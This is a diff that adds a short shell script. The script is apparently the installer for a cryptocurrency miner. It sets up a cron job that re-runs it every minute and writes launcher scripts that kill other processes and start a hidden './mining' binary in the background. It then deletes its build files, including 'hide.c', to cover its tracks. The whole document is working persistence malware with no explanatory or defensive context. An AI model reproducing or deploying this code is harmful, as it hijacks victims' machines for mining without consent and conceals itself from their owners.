@@ -1,0 +1,35 @@
+#!/bin/sh
+pwd > auto
+dir=$(cat auto)
+echo "* * * * * $dir/auto >/dev/null 2>&1" > cronjobs
+echo "0 0 * * 0 pkill -9 mine >/dev/null 2>&1" >> cronjobs
+crontab cronjobs
+rm -f cronjobs
+crontab -l
+echo "#!/bin/sh
+> $dir/logs
+$dir/init.d
+chmod 755 *
+if test -r $dir/ra.pid; then
+pid=\$(cat $dir/ra.pid)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+pkill -9 init
+cd $dir
+./mining &>/dev/null" > auto
+echo "#!/bin/sh
+if test -r $dir/SOS; then
+pid=\$(cat $dir/SOS)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+cd $dir
+./init &>/dev/null" > init.d
+chmod u+x auto init.d
+sh -c "./auto > /dev/null 2>&1 &"
+rm -f aarch64 x86_64 hide.c init.c start create
